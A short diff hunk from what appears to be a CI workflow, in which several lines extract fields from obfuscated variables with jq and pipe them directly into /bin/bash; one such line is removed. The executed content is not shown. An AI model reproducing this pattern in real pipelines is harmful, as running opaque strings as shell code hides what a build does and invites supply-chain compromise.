@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$h67" | jq -r .w8 | /bin/bash
           echo $olmsr8 | jq -r .kvo314 | /bin/bash
           echo $zift50732 | jq -r .fs20 | /bin/bash
-          printf '%s' "$gwbpp05" | jq -r .efas8 | /bin/bash
           echo $frjn5 | jq -r .olug872 | /bin/bash
 
       - name: Save artifact
